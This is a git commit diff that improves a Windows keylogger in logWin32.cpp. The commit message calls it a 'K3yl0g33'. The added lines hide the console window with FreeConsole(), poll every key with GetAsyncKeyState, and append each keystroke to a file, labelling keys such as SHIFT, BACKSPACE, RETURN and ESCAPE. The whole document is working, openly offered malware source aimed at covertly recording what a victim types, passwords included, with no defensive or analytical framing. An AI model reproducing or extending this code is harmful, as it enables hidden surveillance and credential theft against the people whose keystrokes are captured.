7e395bf9201d923563ce621fa6c8ee7f846ae1b8
piezo <piezo5go@gmail.com>
2026-02-01 05:36:21 +0300

    The WIN32 K3yl0g33 should work now eficiently

--- logWin32.cpp
+++ logWin32.cpp
@@ -8,8 +8,10 @@ int Save(int _key, char *file);
 
 
 int main(){
+    FreeConsole();
     char i;
     while(true){
+        Sleep(10);
         for(i=8;i<=255;i++){
             //used to say that if  BUTTON HAS BEEN PRESSED
             if(GetAsyncKeyState(i) == -32767){
@@ -22,11 +24,28 @@ int main(){
 }
 
 int Save(int _key, char *file){
-    cout<<_key<<endl;
 
+    cout<<_key<<endl;
+    Sleep(10);
     FILE *OUTPUTF;
     OUTPUTF = fopen(file, "a+");
-    fprintf(OUTPUTF, "%s", &_key);
+    //catching the other keys virtual keys
+    if(_key == VK_SHIFT)
+        fprintf(OUTPUTF, "%s", "[SHIFT]" );
+    else if(_key == VK_BACK)
+        fprintf(OUTPUTF, "%s", "[BACK]" );
+    else if(_key == VK_LBUTTON)
+        fprintf(OUTPUTF, "%s", "[LBOTTON]" );
+    else if(_key == VK_RETURN)
+        fprintf(OUTPUTF, "%s", "[RETURN]" );
+    else if(_key == VK_ESCAPE)
+        fprintf(OUTPUTF, "%s", "[ESCAPE]" );
+    else 
+        fprintf(OUTPUTF, "%s", &_key );
+    
+
+    
     fclose(OUTPUTF);
     return 0;
 }
+
